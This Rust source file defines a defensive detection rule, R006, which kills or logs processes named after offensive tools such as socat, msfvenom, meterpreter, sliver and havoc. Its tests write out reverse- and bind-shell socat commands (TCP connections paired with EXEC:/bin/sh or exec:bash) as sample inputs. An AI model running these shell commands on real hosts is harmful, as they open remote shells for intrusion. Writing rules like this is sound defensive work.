//! R006 — Known offensive security tooling.
//!
//! External audit PROC-010: the rule killed every exec named `socat`,
//! `/usr/bin/socat` from the distribution included — a relay that
//! virtualisation consoles, port-forwarding and test harnesses run — and an
//! operator had no allowlist to stop it. Now:
//!
//! - the process allowlist applies, judged on what the kernel executed;
//! - a `socat` the distribution installed — its executable in `/usr/bin`,
//!   `/bin`, `/usr/sbin` or `/sbin` — is recorded (Log, High), unless one
//!   of its addresses runs a shell (`EXEC:`, `SYSTEM:` or `SHELL:` with
//!   `sh`, `bash`…), the reverse- or bind-shell shape, which is still
//!   killed;
//! - a `socat` from anywhere else, and the other tools (no distribution
//!   ships them on a server), are still killed.
//!
//! Names are chosen by whoever runs the binary; a renamed tool evades this
//! rule, which the network and staging rules back up.

use std::sync::Arc;

use common::{Event, ResponseAction, Severity, Verdict};

use crate::config::comm_allowlist::{CommAllowlist, Judgement};
use crate::decision::{rules::build_verdict, Rule};

const OFFSEC_COMMS: &[&str] = &["socat", "msfvenom", "meterpreter", "sliver", "havoc"];

/// Where a distribution installs socat. Not the other system trees: a
/// webroot under `/usr/share` is R010's, and a build in `/usr/local` or
/// `/opt` is the operator's to allowlist.
const DISTRIBUTION_BIN_DIRS: &[&str] = &["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"];

/// Shells a socat address can run (`EXEC:/bin/sh`, `SYSTEM:bash -i`).
const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "busybox", "fish", "csh", "tcsh",
];

pub struct R006ReverseShellTooling {
    allowlist: Arc<CommAllowlist>,
}

impl R006ReverseShellTooling {
    pub fn new(allowlist: Arc<CommAllowlist>) -> Self {
        Self { allowlist }
    }
}

/// A socat address in `argv` runs a shell: `EXEC:`, `SYSTEM:` or `SHELL:`
/// (any case) whose program — before socat's `,option` list and its own
/// arguments — is one of [`SHELLS`].
fn socat_runs_a_shell(argv: &[String]) -> bool {
    argv.iter().skip(1).any(|a| {
        let a = a.to_ascii_lowercase();
        let Some(cmd) = ["exec:", "system:", "shell:"]
            .iter()
            .find_map(|t| a.strip_prefix(t))
        else {
            return false;
        };
        let prog = cmd
            .trim_start_matches(['\'', '"', ' '])
            .split([',', ' ', '\'', '"'])
            .next()
            .unwrap_or("");
        SHELLS.contains(&prog.rsplit('/').next().unwrap_or(prog))
    })
}

impl Rule for R006ReverseShellTooling {
    fn id(&self) -> &'static str {
        "R006_ReverseShellTooling"
    }
    fn name(&self) -> &'static str {
        "Reverse shell tooling"
    }
    fn category(&self) -> &'static str {
        "lateral_movement"
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            comm,
            filename,
            exe,
            argv,
            ..
        } = event
        else {
            return None;
        };
        if !OFFSEC_COMMS.iter().any(|c| comm == c) {
            return None;
        }
        let judgement = super::judge_spawn(&self.allowlist, event);
        if judgement == Judgement::Allowed {
            return None;
        }
        let image = exe.path_or(filename);
        let distribution = crate::posture::lineage::in_system_tree(image)
            && DISTRIBUTION_BIN_DIRS.iter().any(|d| image.starts_with(d));
        let verdict = if comm == "socat" && distribution && !socat_runs_a_shell(argv) {
            build_verdict(
                self,
                event,
                ResponseAction::Log,
                Severity::High,
                &format!(
                    "socat installed by the distribution ({image}) — recorded, not \
                     killed: the relay has legitimate uses; one running a shell \
                     (EXEC:/SYSTEM:/SHELL:) is killed"
                ),
            )
        } else {
            build_verdict(
                self,
                event,
                ResponseAction::KillProcess,
                Severity::Critical,
                "Known offensive security tooling detected",
            )
        };
        Some(judgement.apply(verdict, comm))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::decision::rules::testutil::{spawn, spawn_exe, spawn_full};

    fn rule() -> R006ReverseShellTooling {
        R006ReverseShellTooling::new(Arc::new(CommAllowlist::default()))
    }

    #[test]
    fn fires_on_each_offsec_tool() {
        for comm in OFFSEC_COMMS {
            let v = rule()
                .evaluate(&spawn(comm, "/home/alice/whatever"))
                .unwrap_or_else(|| panic!("should fire on {comm}"));
            assert_eq!(v.action, ResponseAction::KillProcess);
            assert_eq!(v.severity, Severity::Critical);
        }
    }

    #[test]
    fn ignores_benign_tools() {
        assert!(rule().evaluate(&spawn("ssh", "/usr/bin/ssh")).is_none());
    }

    #[test]
    fn match_is_exact_not_prefix() {
        assert!(rule()
            .evaluate(&spawn("socat-helper", "/usr/bin/socat-helper"))
            .is_none());
    }

    /// External audit PROC-010: the distribution's socat is recorded; a
    /// copy anywhere else, and the other tools from anywhere, are killed.
    #[test]
    fn r006_system_socat_is_recorded_a_copy_is_killed() {
        let v = rule()
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .unwrap();
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::High);
        for (comm, path) in [
            ("socat", "/home/alice/socat"),
            ("socat", "/usr/bin/../../tmp/socat"),
            ("socat", "/usr/share/nginx/html/socat"),
            ("socat", "/opt/tools/socat"),
            ("msfvenom", "/usr/bin/msfvenom"),
        ] {
            let v = rule().evaluate(&spawn_exe(comm, comm, path, 0)).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcess, "{path}");
            assert_eq!(v.severity, Severity::Critical, "{path}");
        }
    }

    /// External audit PROC-010: a system socat that runs a shell is the
    /// reverse- or bind-shell shape, and is killed.
    #[test]
    fn r006_system_socat_running_a_shell_is_killed() {
        for args in [
            &[
                "socat",
                "TCP:10.0.0.9:4444",
                "EXEC:/bin/sh,pty,stderr,setsid",
            ][..],
            &["socat", "tcp-listen:9001,fork", "exec:bash -li"][..],
            &["socat", "-d", "TCP:h:1", "SYSTEM:'sh -i'"][..],
            &["socat", "TCP:h:1", "SHELL:zsh"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcess, "{args:?}");
        }
        for args in [
            &[
                "socat",
                "UNIX-CONNECT:/run/qemu/serial0",
                "STDIO,raw,echo=0",
            ][..],
            &["socat", "TCP-LISTEN:8080,fork", "TCP:127.0.0.1:80"][..],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::Log, "{args:?}");
        }
    }

    /// External audit PROC-010: an operator allowlist, judged on what the
    /// kernel executed: the installed socat is exempt, a copy is not.
    #[test]
    fn r006_allowlisted_by_identity_is_exempt() {
        let r = R006ReverseShellTooling::new(Arc::new(CommAllowlist::from_iter_owned([
            "socat".to_string()
        ])));
        assert!(r
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .is_none());
        let v = r
            .evaluate(&spawn_exe("socat", "./socat", "/home/alice/socat", 0))
            .expect("a copy is not the allowlisted socat");
        assert_eq!(v.action, ResponseAction::KillProcess);
        assert!(v.reasoning.contains("named 'socat'"), "{}", v.reasoning);
    }
}
